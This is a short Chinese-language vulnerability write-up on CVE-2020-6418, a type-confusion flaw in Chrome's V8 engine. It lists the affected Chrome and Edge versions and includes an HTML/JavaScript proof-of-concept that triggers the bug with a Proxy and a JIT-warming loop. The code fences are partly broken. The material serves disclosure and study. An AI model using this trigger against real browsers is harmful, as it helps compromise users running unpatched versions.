---
title: （CVE-2020-6418）Chrome 远程代码执行漏洞
id: zhfly2961
---

# （CVE-2020-6418）Chrome 远程代码执行漏洞

## 一、漏洞简介

在Google Chrome浏览器80.0.3987.122以下与Microsoft Edge浏览器80.0.361.62以下的版本中，开源JavaScript和WebAssembly引擎V8中存在一个类型混淆漏洞（CVE-2020-6418），可能导致攻击者非法访问数据，从而执行恶意代码。

## 二、漏洞影响

Google Chrome浏览器80.0.3987.122以下与Microsoft Edge浏览器80.0.361.62以下的版本中

## 三、复现过程

### poc

```
<!DOCTYPE html>
<head>
    <script>
        ITERATIONS = 10000
        TRIGGER = false

```
 function f(a,p){
        return a.pop(Reflect.construct(function(){}, arguments, p))
    }

    let a;
    let p = new Proxy(Object, {
        get: function(){
            if (TRIGGER){
                a[2] = 1.1;
            }
            return Object.prototype;
        }
    });
    for(let i = 0; i &lt; ITERATIONS; i++){
        let isLastIteration = i==ITERATIONS-1;
        a = [0,1,2,3,4];
        if(isLastIteration)
            TRIGGER = true;
        console.log(f(a,p));
    }
    console.log(a)
&lt;/script&gt; 
``` `</head>

<body>

CVE-2020-6418 PoC!

</body>` 
```

## 参考链接

> https://github.com/ChoKyuWon/CVE-2020-6418/blob/master/poc.html